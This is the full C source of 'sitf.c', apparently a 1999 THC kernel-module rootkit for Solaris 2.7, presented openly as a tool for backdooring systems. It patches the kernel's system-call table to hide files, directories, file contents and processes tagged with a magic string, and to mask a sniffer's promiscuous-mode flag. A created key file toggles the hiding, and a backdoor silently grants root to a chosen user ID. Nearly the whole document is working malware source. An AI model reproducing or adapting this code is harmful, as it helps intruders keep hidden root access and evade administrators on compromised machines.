/*
 * sitf.c v0.1
 * Solaris Integrated Trojan Facility for Solaris 2.7 (sparc/x86)
 * (c) 1999 by Plasmoid/THC <plasmoid@pimmel.com>
 * [THC] The Hacker's Choice - http://www.infowar.co.uk/thc
 *
 * This module is the old version of the sitf.c v0.2 module. It features
 * process hiding that is based on the proc file system by redirecting the
 * open() and read() syscall. It's not adviced to use such mechanisms since
 * they may consum too much cpu power on systems with a lot of processes
 * and users.
 *
 * WARNING!
 * This module does *NOT* work on Solaris 2.6-2.7 Ultra Sparc. You should 
 * really use sitf0.2.c if you are planning to backdoor a Solaris 
 * system. This module is just an other approach to the process hiding
 * mechanisms.
 * 
 * Module features: - File hiding
 *                  - File content and directory hiding
 *                  - Switch to toggle file content and directory hiding
 *                  - Process hiding (proc file system)
 *                  - Promiscous flag hiding
 *                  - Converting magic uid to root uid
 *
 * A documentation of the modules functions can be found in the corresponding
 * THC article at http://www.infowar.co.uk/thc/files/thc/slkm-1.0.html
 *
 *    Solaris Loadable Kernel Modules v1.0
 *    "Attacking Solaris with lodable kernel modules"
 *    by Plasmoid/THC
 *
 */
#include <sys/systm.h>
#include <sys/ddi.h>
#include <sys/sunddi.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/dirent.h>
#include <sys/procfs.h>
#include <sys/sockio.h>
#include <sys/socket.h>
#include <sys/kmem.h>
#include <sys/errno.h>
#include <net/if.h>
#include <fcntl.h>
#include <unistd.h>

/*
 * Customize your module here:
 * MAGIC: this string is called the magic word, files and processes containing
 *        the magic word won't be displayed. directories containing the magic
 *        word cannot be entered if the security flag is set. if the security
 *        flag is set, the file content will also be hidden.
 * KEY:   this is you key to enable and disable the security flag by using the
 *        touch command. e.g. $ touch mykey
 * UID:   if a user logins in and his id is UID he will be automatically get
 *        the superuser id.
 */
#define MAGIC   "CHT.THC"
#define KEY	"mykey"
#define UID     1001

/*
 * This is just a little definition to make the code better readable
 */
#define	TRUE	1
#define FALSE	0

/*
 * This is the loadable module wrapper.
 */
#include <sys/modctl.h>
extern struct mod_ops mod_miscops;

/*
 * Structure of the system-entry table.
 */
extern struct sysent sysent[];

int (*oldsetuid) (uid_t);
int (*oldgetdents64) (int, struct dirent64 *, size_t);
int (*oldopen64) (const char *path, int oflag, mode_t mode);
int (*oldopen) (const char *path, int oflag, mode_t mode);
int (*oldchdir) (const char *path);
int (*oldcreat64) (const char *path, mode_t mode);
ssize_t(*oldread) (int fildes, void *buf, size_t nbyte);
int (*oldioctl) (int fildes, int request, unsigned long arg);

char magic[] = MAGIC;
char key[] = KEY;
char psinfo[] = "psinfo";
int security = FALSE;
int psfildes = FALSE;
int promisc = FALSE;

/*
 * The promiscous flag will only be hidden the first time it is changed, 
 * if the admin would run a sniffer, he wouldn't detect any unusual things.
 */
int newioctl(int fildes, int request, unsigned long arg)
{
    int ret;
    struct ifreq ifr;

    ret = oldioctl(fildes, request, arg);

    if (request == SIOCGIFFLAGS && !promisc) {
#ifdef DEBUG
	cmn_err(CE_NOTE, "sitf: hiding promisc flag on interface");
#endif
	copyin((struct ifreq *) arg, (struct ifreq *) &ifr, sizeof(struct ifreq));
	ifr.ifr_flags = ifr.ifr_flags & (~IFF_PROMISC);
	copyout((struct ifreq *) &ifr, (struct ifreq *) arg, sizeof(struct ifreq));

    } else if (request == SIOCSIFFLAGS) {
	copyin((struct ifreq *) arg, (struct ifreq *) &ifr, sizeof(struct ifreq));

	if (ifr.ifr_flags & IFF_PROMISC)
	    promisc = TRUE;
	else if (!(ifr.ifr_flags & IFF_PROMISC))
	    promisc = FALSE;
    }
    return ret;
}

/*
 * If a file is opened from the directory /proc/<pid>/psinfo that has the
 * size of the psinfo_t struct, the function will return an error. This
 * behaviour results in hiding the <pid>.
 */
ssize_t
newread(int fildes, void *buf, size_t nbyte)
{
    ssize_t ret;
    psinfo_t *info;

    ret = oldread(fildes, buf, nbyte);
    if (fildes > 0 && fildes == psfildes && nbyte == sizeof(psinfo_t)) {
	info = (psinfo_t *) kmem_alloc(sizeof(psinfo_t), KM_SLEEP);
	copyin(buf, (void *) info, sizeof(psinfo_t));

	if (strstr(info->pr_psargs, (char *) &magic) != NULL) {
#ifdef DEBUG
	    cmn_err(CE_NOTE, "hiding process: %s", info->pr_psargs);
#endif
	    kmem_free(info, sizeof(psinfo_t));
	    set_errno(ENOENT);
	    return -1;
	} else
	    kmem_free(info, sizeof(psinfo_t));
    }
    return ret;
}

/*
 * The creat64() syscalls is used as switch for enabling and disabling the
 * directory and file content hiding.
 */
int newcreat64(const char *path, mode_t mode)
{
    if (strstr(path, (char *) &key) != NULL) {
	if (security) {
#ifdef DEBUG
	    cmn_err(CE_NOTE, "sitf: disabeling security");
#endif
	    security = FALSE;
	} else {
#ifdef DEBUG
	    cmn_err(CE_NOTE, "sitf: enabeling security");
#endif
	    security = TRUE;
	}
	set_errno(ENFILE);
	return -1;
    } else
	return oldcreat64(path, mode);
}

/*
 * If the security flag is enabled, directories containing the magic word
 * can't be entered.
 */
int newchdir(const char *path)
{
    if (security && strstr(path, (char *) &magic) != NULL) {
#ifdef DEBUG
	cmn_err(CE_NOTE, "sitf: hiding directory (%s)", path);
#endif
	set_errno(ENOENT);
	return -1;
    } else
	return oldchdir(path);
}

/*
 * This function does NOT hide the file content, under Solaris 2.7
 * files are opened using the open64() call. Only the proc fs uses this
 * obsolete call. Instead this function checks if the file to be opened
 * is placed in the directory /proc/<pid>/psinfo and will report the 
 * the result to the read64() syscall (some lines above).
 */
int newopen(const char *path, int oflag, mode_t mode)
{
    int ret;

    ret = oldopen(path, oflag, mode);
    if (strstr(path, (char *) &psinfo) != NULL) {
	psfildes = ret;
    } else
	psfildes = FALSE;

    return ret;
}

/* 
 * If the security flag is enabled, files containing the magic string, can't
 * be opened. This is nice feature, eventhough these files are hiden from 
 * being listed by a "ls", a clever admin could guess the filename.
 */
int newopen64(const char *path, int oflag, mode_t mode)
{
    int ret;

    ret = oldopen64(path, oflag, mode);
    if (security && strstr(path, (char *) &magic) != NULL) {
#ifdef DEBUG
	cmn_err(CE_NOTE, "sitf: hiding content of file (%s)", path);
#endif
	set_errno(ENOENT);
	return -1;
    } else {
	return ret;
    }
}

/*
 * This function has been recoded from the original source of itf.c
 * by plaguez. It does not work properly with files containing the
 * magic string MORE than once. Don`t play with it, files containing
 * more than one magic string definitely cause crashes, this bug is
 * even present in the original code. 
 * This might sound like a bug, but I don't care, I never came to 
 * the situation renaming a file containing the magic word more
 * than once. 
 */
int newgetdents64(int fildes, struct dirent64 *buf, size_t nbyte)
{
    int ret, oldret, i, reclen;
    struct dirent64 *buf2, *buf3;

    oldret = (*oldgetdents64) (fildes, buf, nbyte);
    ret = oldret;

    if (ret > 0) {
	buf2 = (struct dirent64 *) kmem_alloc(ret, KM_SLEEP);
	copyin((char *) buf, (char *) buf2, ret);
	buf3 = buf2;

	i = ret;
	while (i > 0) {
	    reclen = buf3->d_reclen;
	    i -= reclen;

	    if (strstr((char *) &(buf3->d_name), (char *) &magic) != NULL) {
#ifdef DEBUG
		cmn_err(CE_NOTE, "sitf: hiding file (%s)", buf3->d_name);
#endif
		if (i != 0)
		    memmove(buf3, (char *) buf3 + buf3->d_reclen, i);
		else
		    buf3->d_off = 1024;
		ret -= reclen;
	    }
	    /* 
	     * most people implement this little check into their modules,
	     * don't ask me, if some of the solaris fs driver modules really
	     * generate a d_reclen=0.
	     * correction: this code is needed for solaris sparc at least, 
	     * otherwise you`ll find yourself back in a world of crashes.
	     */
	    if (buf3->d_reclen < 1) {
		ret -= i;
		i = 0;
	    }
	    if (i != 0)
		buf3 = (struct dirent64 *) ((char *) buf3 + buf3->d_reclen);
	}
	copyout((char *) buf2, (char *) buf, ret);
	kmem_free(buf2, oldret);
    }
    return ret;
}

/* 
 * This call is uncommented and you should know why...
 */
int newsetuid(uid_t uid)
{
    if (uid == UID) {
#ifdef DEBUG
	cmn_err(CE_NOTE, "sitf: setting uid(%d) to uid(0)", uid);
#endif
	seteuid(0);
	setgid(0);
	setegid(0);
	return oldsetuid(0);
    }
    return oldsetuid(uid);
}

/*
 * Module linkage information for the kernel.
 */
static struct modlmisc modlmisc =
{
    &mod_miscops,
#ifdef DEBUG
    "Solaris ITF",
#else
    ""
#endif
};

static struct modlinkage modlinkage =
{
    MODREV_1,
    (void *) &modlmisc,
    NULL
};

int _init(void)
{
    int i;

    if ((i = mod_install(&modlinkage)) != 0)
	cmn_err(CE_NOTE, "Could not install module\n");
#ifdef DEBUG
    else
	cmn_err(CE_NOTE, "sitf: successfully installed");
#endif

    oldsetuid = (void *) sysent[SYS_setuid].sy_callc;
    oldgetdents64 = (void *) sysent[SYS_getdents64].sy_callc;
    oldopen64 = (void *) sysent[SYS_open64].sy_callc;
    oldopen = (void *) sysent[SYS_open].sy_callc;
    oldchdir = (void *) sysent[SYS_chdir].sy_callc;
    oldcreat64 = (void *) sysent[SYS_creat64].sy_callc;
    oldread = (void *) sysent[SYS_read].sy_callc;
    oldioctl = (void *) sysent[SYS_ioctl].sy_callc;

    sysent[SYS_setuid].sy_callc = (void *) newsetuid;
    sysent[SYS_getdents64].sy_callc = (void *) newgetdents64;
    sysent[SYS_open64].sy_callc = (void *) newopen64;
    sysent[SYS_open].sy_callc = (void *) newopen;
    sysent[SYS_chdir].sy_callc = (void *) newchdir;
    sysent[SYS_creat64].sy_callc = (void *) newcreat64;
    sysent[SYS_read].sy_callc = (void *) newread;
    sysent[SYS_ioctl].sy_callc = (void *) newioctl;

    return i;
}

int _info(struct modinfo *modinfop)
{
    return (mod_info(&modlinkage, modinfop));
}


int _fini(void)
{
    int i;

    if ((i = mod_remove(&modlinkage)) != 0)
	cmn_err(CE_NOTE, "Could not remove module\n");
#ifdef DEBUG
    else
	cmn_err(CE_NOTE, "sitf: successfully removed");
#endif

    sysent[SYS_setuid].sy_callc = (void *) oldsetuid;
    sysent[SYS_getdents64].sy_callc = (void *) oldgetdents64;
    sysent[SYS_open64].sy_callc = (void *) oldopen64;
    sysent[SYS_open].sy_callc = (void *) oldopen;
    sysent[SYS_chdir].sy_callc = (void *) oldchdir;
    sysent[SYS_creat64].sy_callc = (void *) oldcreat64;
    sysent[SYS_read].sy_callc = (void *) oldread;
    sysent[SYS_ioctl].sy_callc = (void *) oldioctl;

    return i;
}
